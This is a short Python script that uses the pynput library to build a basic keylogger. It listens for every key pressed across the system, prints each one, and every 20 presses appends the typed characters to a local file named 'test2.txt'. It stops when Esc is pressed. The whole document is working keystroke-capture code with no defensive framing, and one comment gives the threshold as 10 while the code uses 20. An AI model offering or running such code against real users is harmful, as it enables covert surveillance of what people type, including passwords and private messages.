# -*- coding: utf-8 -*-
#import the module pynput
import pynput

from pynput.keyboard import Key,Listener

#keeping a count of the keys pressed in the list
count = 0
keys = []


# on_press key event
def press(key):
    global keys, count
    #the keys are recorded and joined  here
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))
    #if the count is 10 or more update in the file
    if count>=20:
        count=0
        write_file(keys)
        keys=[]
        
        
# write the keys in the file 
   
def write_file(keys):
     with open("test2.txt","a") as f:
         for key in keys:
             #replace the quotation with empty
             k = str(key).replace("'","")
             #if the key space is recorded create new line
             if k.find("space") > 0:
                 f.write('\n')
             elif k.find("Key") == -1:
                 f.write(k)
                 
             
# on_release event             

def release(key):
    if key == Key.esc:
        return False
    
    
# listener listens to the key events
with Listener(on_press= press,on_release= release) as listener:
    listener.join()


















